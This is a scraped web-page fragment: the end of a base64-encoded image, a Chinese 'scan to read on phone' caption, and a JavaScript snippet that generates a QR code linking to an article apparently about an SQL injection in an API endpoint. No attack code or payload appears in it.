J8ZuF46WXRgHgjV3nBDAI0D+8ldIdxr20CuGu3cz53A7Q+Gq61AP2k9YbKqVVyt5kY/uvDg/nBgclcIhx7m951VLaxrtKfo5cvA2pFf5aJZofSyVW7fkNWp/CLXBgKePvS42pumKxtz4mLQ9wk/1igGa+WfGdxrUjuuNcbRrRC8Dsw49oFDM/YC50Z+FaevsA1kJdzcz59A+9WJplPtaitwP/3aSz64BmZUvtrV2q/kYF4DeKW009Q9yU9SvizxFQLtO7IzHRyafUPOTumX+D2Qy4P/+eT0bW+2oCs52lkOjisH9qMdsfZMDlwDxqoZ/dSMfI1HTeKK0VfuzAfv6ywvPv1GVC6WXOJgeOG+ITmVN8H2pg5+CuB1fOVrAPe70urJkEUD9zWjFgg1oXrLgOkNVrwsRfJjYH3iaMB84orweg5m7b4h9TTfwG8DyVPwCo77XtVEk1xi8FMBhLp9aiUEnjr51dJfWHn5sK5RLga9BhwDkTQEnnvQWrKWKI54WaEmF/o+4BjYf3Xy8WYf7YZkX3BMC3o/mlcQ+lo9NbJVrXhZcuDaxCsEa2DGUQ/WVB7MaV1ZzY0+9FpwXHVgDnqsGq0jCwfWiotNA4l44++cwB7I75z76apfMhDw1aur5ApW7k99cF+glabvCpvoXyeaf8MOznLhK6YQeL6pJ15h6pJLLATXy68G5oH9pv7xZh9fckNWXxN46slBH4vPUwJ9LvwKodeCY7j/F8LaT+vLwPXJgWM4ULpXDVyXfqs6sCa5aIXfNpAstvHPTmAaiKZ0ZmetowdPHmjS5IIt8XCA7jU5Guj5h7R9XmlgXZea1uThQK8Fx9EKH7KXP6WXpQDcL7FQ+WriZGAtsN9DPt7so90QOKYE1/4rX0OehGjBPcOvMNrkwDVAUpeYumDEwPMmwoHRjAjnmvRLTeIrhKMf9H7q0k/YBpLkxt89gT2Q3z3/afX/AgAA//9YpkCcAAAABklEQVQDAESTVJh9QiGLAAAAAElFTkSuQmCC)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/api-get\_sos-items-usernumber-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 